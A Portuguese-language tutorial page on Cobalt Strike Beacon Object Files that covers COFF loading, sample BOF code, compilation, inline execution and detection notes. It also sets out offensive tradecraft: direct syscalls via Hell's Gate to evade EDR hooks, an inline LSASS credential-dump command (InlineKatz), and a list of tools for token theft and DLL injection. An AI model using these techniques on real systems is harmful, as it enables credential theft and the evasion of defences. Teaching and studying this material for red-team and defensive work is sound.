---
layout: cyber
section: c2
title: "Beacon Object Files (BOFs)"
---

# 07. Beacon Object Files (BOFs)

## Execução Inline No Beacon

BOFs executam código diretamente na memória do Beacon sem spawn de processo novo. Quatro vantagens definem o ganho operacional: sem fork-and-run (nenhum processo filho criado), código executa no contexto do Beacon (herda token, contexto de rede), `.o` (COFF) é muito menor que DLL ou EXE, e roda inteiramente em memória sem tocar disco. BOFs foram popularizados pelo Cobalt Strike 4.1 (2020) mas hoje têm suporte em Sliver, Havoc, Brute Ratel.

---

## Formato COFF e Mecânica de Loading

### Formato COFF

BOF = arquivo COFF (Common Object File Format) — **não linkedado**, apenas compilado. Diferença fundamental:
- **Executável**: código linkado, endereços resolvidos, pronto para execução.
- **COFF .o**: code + relocation table — loader (Beacon) resolve relocations em runtime.

Beacon é o "loader" ad-hoc para cada BOF. Cada vez que BOF é executado:
1. Beacon lê seções `.text`/`.data` do .o.
2. Aloca RWX buffer.
3. Copia seções.
4. Processa `IMAGE_RELOCATION` entries — resolve referências a imports (`BeaconPrintf`, `KERNEL32$CreateProcessA`, etc.).
5. Chama `go(char* args, int argslen)` — entry point do BOF.
6. BOF executa → retorna → Beacon libera buffer.

### Naming Convention de Imports

BOFs não chamam APIs diretamente. Usam string conventions:

```
KERNEL32$CreateProcessA     → LoadLibrary("KERNEL32") + GetProcAddress("CreateProcessA")
NTDLL$NtAllocateVirtualMemory → GetModuleHandle("NTDLL") + GetProcAddress(...)
```

Beacon resolve via sua `BeaconGetSpawnTo` / internal resolver.

---

## Na Prática

### 1. Estrutura de um BOF

```c
// hello.c — BOF simples
#include <windows.h>
#include "beacon.h"       // header Cobalt Strike (disponível no arsenal kit)

// Import declarations (naming convention BOF)
DECLSPEC_IMPORT VOID WINAPI KERNEL32$Sleep(DWORD);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$GetComputerNameA(LPSTR, LPDWORD);

void go(char* args, int argslen) {
    char szHostname[256];
    DWORD dwLen = sizeof(szHostname);
    
    KERNEL32$GetComputerNameA(szHostname, &dwLen);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Hostname: %s\n", szHostname);
    
    KERNEL32$Sleep(1000);
}
```

### 2. BeaconDataParse — Argumentos do Operador

Operador envia argumentos do teamserver via buffer serializado. BOF usa `beacon.h` helpers:

```c
#include "beacon.h"

void go(char* args, int argslen) {
    datap parser;
    BeaconDataParse(&parser, args, argslen);

    int  dwPid     = BeaconDataInt(&parser);
    char* szArg1   = BeaconDataExtract(&parser, NULL);
    short sFlag    = BeaconDataShort(&parser);

    BeaconPrintf(CALLBACK_OUTPUT, "PID: %d, Arg: %s, Flag: %d\n",
                 dwPid, szArg1, sFlag);
}
```

No Aggressor Script (BOF caller):
```
$args = bof_pack($1, "izs", $pid, $arg1, $flag);
beacon_inline_execute($bid, $bof_bytes, "go", $args);
```

### 3. Compilação

```bash
# MSVC x64 (sem linker)
cl.exe /c /GS- /Ox /W0 hello.c /Fo hello.x64.o

# MinGW (Linux host)
x86_64-w64-mingw32-gcc -o hello.x64.o -c hello.c

# Confirmar COFF (não PE)
file hello.x64.o  # → "Intel amd64 COFF object file"
```

### 4. Inline Execute no Cobalt Strike

```
# Beacon> inline-execute /path/hello.x64.o
# Ou via Aggressor script
inline-execute <bid> /path/to/hello.x64.o [optional_args]
```

Havoc/Sliver têm comandos equivalentes (`execute-bof`, `inline-execute`).

---

## BOF Avançado — Syscalls Diretas

BOFs podem fazer syscalls diretamente (sem depender de ntdll hookado):

```c
// Em BOF: usar SysWhispers2 generated stubs
// NtAllocateVirtualMemory syscall direto (SSN known at compile time ou Hell's Gate)

typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

void go(char* args, int argslen) {
    // Resolver ntdll base via PEB walk (sem GetModuleHandle — hookado)
    HMODULE hNtdll = (HMODULE)GetNtdllBaseFromPEB();

    // Calcular SSN manualmente (Hell's Gate)
    PBYTE pStub = (PBYTE)GetExportByName(hNtdll, "NtAllocateVirtualMemory");
    DWORD dwSsn = *(DWORD*)(pStub + 4);

    // Execute syscall em assembly stub embutido no BOF
    // [...]
}
```

---

## BOFs para LSASS Dump (InlineKatz)

**InlineKatz** = Mimikatz lógica implementada como BOF → sem fork-and-run lsass dump:

```
# No Beacon:
inline-execute InlineKatz.x64.o
# Output: ntlm hashes direto no callback output
```

Sem processo filho (`procdump`, `rundll32 comsvcs`), sem arquivo em disco.

---

## BOFs Úteis (Arsenal)

| BOF | Função | Repo |
|-----|--------|------|
| TrustedSec/BOF-Collection | Enumeração AD, net sessions, named pipes | TrustedSec/BOF-Collection |
| InlineWhispers | Syscalls diretas em BOF | outflanknl/InlineWhispers |
| Nanodump-BOF | LSASS dump inline | helpsystems/nanodump |
| SpawnAs-BOF | Criar processo como outro user | TrustedSec/BOF-Collection |
| DLL-Inject-BOF | Injetar DLL sem fork | TrustedSec |
| Token-Vault | Gerenciar tokens roubados | mgeeky/Token-Vault |
| SA-NamedPipeImpersonate | Named pipe impersonation inline | TrustedSec |

---

## Detecção

- **Memory**: Beacon aloca RWX buffer para BOF → pe-sieve/Moneta detecta RWX region não associada a módulo.
- **Syscalls**: BOF com direct syscalls evita hooks mas ETW-Ti captura `NtAllocateVirtualMemory` via kernel.
- **Exports**: `.o` sem entrada de IAT não aparece em process imports — stealth.
- **Comportamento**: ações do BOF (enumeração AD, LDAP queries) são indistinguíveis de ferramentas legítimas — detection tem que ser baseada em contexto.

## Mitigação

- Detecção de BOF = detectar Beacon + detecção comportamental (query AD suspeito por processo não-admin).
- Memory scan proativo (não-on-access) pega RWX após execução.

## Leitura Complementar

- TrustedSec BOF Collection — https://github.com/trustedsec/CS-Situational-Awareness-BOF
- Cobalt Strike BOF docs — cobaltstrike.com/help-beacon-object-files
- ZPS BOF Development and Tradecraft (curso completo de BOF)
- MITRE ATT&CK T1620 — Reflective Code Loading
